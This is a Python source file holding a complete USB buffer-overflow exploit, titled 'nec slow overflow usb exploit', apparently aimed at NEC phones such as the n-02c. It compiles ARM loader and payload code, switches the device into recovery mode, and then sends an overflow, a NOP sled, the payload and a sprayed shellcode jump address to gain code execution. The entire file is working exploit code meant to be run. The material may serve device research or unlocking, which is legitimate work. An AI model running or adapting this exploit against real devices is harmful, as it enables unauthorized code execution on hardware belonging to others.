import usb.core
import usb.util
import struct
import random
import sys
import time
import argparse
import os
import tempfile
import subprocess
from tqdm import tqdm


PAYLOAD_PATH = os.path.dirname(os.path.realpath(__file__))
LINKER = """
ENTRY(start)

SECTIONS
{
  . = BASE;

  .text     : { *(.text.start) *(.text   .text.*   .gnu.linkonce.t.*) }
  .rodata   : { *(.rodata .rodata.* .gnu.linkonce.r.*) }
  .bss      : { *(.bss    .bss.*    .gnu.linkonce.b.*) *(COMMON) }
  .data     : { *(.data   .data.*   .gnu.linkonce.d.*) }
  /DISCARD/ : { *(.interp) *(.dynsym) *(.dynstr) *(.hash) *(.dynamic) *(.comment) }
}
"""

CC = ["arm-none-eabi-gcc", "-c", "-Os", "-march=armv4", "-fno-builtin-printf", "-fno-strict-aliasing", "-fno-builtin-memcpy", "-fno-builtin-memset", "-fno-builtin", "-I", PAYLOAD_PATH]
AS = ["arm-none-eabi-as", "-c"]
LD = ["arm-none-eabi-gcc", "-nodefaultlibs", "-nostdlib"]
OBJCOPY = ["arm-none-eabi-objcopy", "-O", "binary"]


class PayloadBuilder:

    def __init__(self, srcfile):
        self.ext = "c"
        if srcfile.endswith(".S"):
            self.ext = "S"
        with open(os.path.join(PAYLOAD_PATH, srcfile)) as inf:
            self.src = inf.read()

    def build(self, **kwargs):
        base = kwargs["base"]
        src = self.src
        for arg, replacement in kwargs.items():
            src = src.replace("%{}%".format(arg), str(replacement))

        with tempfile.TemporaryDirectory() as tmp:
            p_linker_x = os.path.join(tmp, "linker.x")
            p_payload_src = os.path.join(tmp, "payload.{}".format(self.ext))
            p_payload_o = os.path.join(tmp, "payload.o")
            p_payload = os.path.join(tmp, "payload")
            p_payload_bin = os.path.join(tmp, "payload.bin")

            with open(p_linker_x, "w") as outf:
                outf.write(LINKER.replace("BASE", hex(base)))
            with open(p_payload_src, "w") as outf:
                outf.write(src)
            if self.ext == "c":
                subprocess.check_output(CC + ["-o", p_payload_o, p_payload_src])
            elif self.ext == "S":
                subprocess.check_output(AS + ["-o", p_payload_o, p_payload_src])
            subprocess.check_output(LD + ["-T", p_linker_x, "-o", p_payload, p_payload_o, "-lgcc"])
            subprocess.check_output(OBJCOPY + [p_payload, p_payload_bin])
            with open(p_payload_bin, "rb") as inf:
                payload = inf.read()
        return payload


def mask_payload(buf):
    output = []
    for ch in buf:
        if ch in [0xF0, 0xFF, 0xFE]:
            output.append(0xF0)
            output.append(ch ^ 0x10)
        else:
            output.append(ch)
    output += [0xF0, 0xF0]
    return bytes(output)


def mask_packet(pkt):
    out = [0xFF]
    ck = 0
    for b in pkt:
        if b in [0xFD, 0xFE, 0xFF]:
            out.append(0xFD)
            out.append(b ^ 0x10)
        else:
            out.append(b)
        ck += b
    ck = (-ck) & 0xFF
    if ck in [0xFD, 0xFE, 0xFF]:
        out.append(0xFD)
        out.append(ck ^ 0x10)
    else:
        out.append(ck)
    out.append(0xFE)

    return bytearray(out)


def make_packet(cmd, subcmd, variable_payload=None):
    if variable_payload is None:
        variable_payload = b""
    packet = struct.pack("<BBBHBBBB", 0xE9, 0xE3, 0x42, 6 + len(variable_payload), 0, 0, cmd, subcmd) + variable_payload
    return mask_packet(packet)


def unmask_resp(resp):
    assert resp[0] == 0xFF
    assert resp[-1] == 0xFE
    resp = resp[1:-1]
    out = []
    x = 0
    while x < len(resp):
        if resp[x] == 0xFD:
            out.append(resp[x+1] ^ 0x10)
            x += 2
        else:
            out.append(resp[x])
            x += 1
    return bytearray(out)


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--iplmts', action='store_true')
        parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--stage1', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--stage1_mask', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--stage2', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--stage4', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--stage4_spam', type=lambda x: int(x, 16), required=True)

        self.args = parser.parse_args()
        self.build_payload()

        assert self.args.stage1 % 4 == 0
        assert self.args.stage2 % 4 == 0
        assert self.args.stage4 % 4 == 0

    def build_payload(self):
        if self.args.iplmts:
            self.payload = PayloadBuilder("iplmts.S").build(base=0xDEAD0000)
        else:
            loader = PayloadBuilder("loader.S").build(base=0xDEAD0000)
            assert loader[-4:] == b"\xEF\xBE\xAD\xDE"
            loader = loader[:-4]
            payload = PayloadBuilder("payload.c").build(base=0x80000000)
            self.payload = loader + mask_payload(payload)

        while len(self.payload) % 4 != 0:
            self.payload += b"\x00"

    def write_fully(self, buffer):
        assert b"\xFE" not in buffer and b"\xFF" not in buffer

        total = 0
        try:
            for x in range(0, len(buffer), 64):
                chunk = buffer[x:x+64]
                assert self.dev.write(8, chunk) == len(chunk)
                total += len(chunk)
        except Exception:
            print("wrote 0x{:X} bytes at the moment of exception".format(total))
            raise

    def comm_oneway(self, cmd, subcmd=0, variable_payload=None):
        pkt = make_packet(cmd, subcmd, variable_payload)
        ret = self.dev.write(0x8, pkt)

    def comm(self, cmd, subcmd=0, variable_payload=None):
        self.comm_oneway(cmd, subcmd, variable_payload)
        resp = b""
        while True:
            resp += self.dev.read(0x87, 64)
            if resp.endswith(b"\xFE"):
                break
        return unmask_resp(resp)

    def run(self):
        print("=" * 80)
        print("nec slow overflow usb exploit")
        print("=" * 80)

        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
        if self.dev is None:
            raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))

        # go into serial comms mode => turns green led on for some, display on
        print("Enter recovery mode")
        self.dev.ctrl_transfer(0x41, 0x60, 0x60, 2)
        self.dev.read(0x86, 64)

        # some devices e.g. n-02c need delay/reinit before it can be used
        print("Wait 3s...")
        time.sleep(3)
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)

        if self.args.iplmts:
            print("Enter iplmts")
            self.comm(0x03, subcmd=0, variable_payload=b"\x20")

        print("1) move writeptr behind buffer")
        overflow_payload = b""
        for x in range(self.args.stage1 // 4):
            if x == 0:
                bdata = b"\xFD\xFD\xFD\xFD"
            else:
                bdata = struct.pack("<I", len(overflow_payload) | self.args.stage1_mask)
            if b"\xFF" in bdata or b"\xFE" in bdata:
                bdata = b"\x42\x42\x42\x42"
            overflow_payload += bdata

        self.write_fully(overflow_payload)

        print("2) {:.2f} MB of nops".format(self.args.stage2 / 1024 / 1024))
        total = 0
        try:
            with tqdm(total=self.args.stage2, unit='B', unit_scale=True, unit_divisor=1024) as bar:
                for x in range(0, self.args.stage2, 64):
                    chunk = b"\x00" * min(64, self.args.stage2 - x)
                    assert self.dev.write(0x8, chunk) == len(chunk)
                    bar.update(len(chunk))
                    total += len(chunk)
        except Exception:
            print("wrote before exception: 0x{:X}".format(total))
            raise

        print("3) write payload size=0x{:X}".format(len(self.payload)))
        self.write_fully(self.payload)

        print("4) spam shellcode jump")

        total = 0
        try:
            with tqdm(total=self.args.stage4, unit='B', unit_scale=True, unit_divisor=1024) as bar:
                for x in range(0, self.args.stage4, 64):
                    chunk = struct.pack("<I", self.args.stage4_spam) * 16
                    chunk = chunk[0:min(64, self.args.stage4 - x)]
                    self.write_fully(chunk)
                    total += len(chunk)
                    bar.update(len(chunk))
        except (Exception, KeyboardInterrupt):
            print("wrote before exception: 0x{:X}".format(total))
            print("suggestion: reduce --stage4 to under 0x{:X}, or check the screen if exploit succeeded anyway".format(total))
            raise

        # trigger code exec (may not be required)
        try:
            self.dev.write(8, b"\xFE\xFD\xFD\xFE")
        except Exception:
            print("check the display in case exploit succeeded anyway; if not, recheck the arguments")
            raise


def main():
    e = Exploit()
    e.run()


if __name__ == "__main__":
    main()
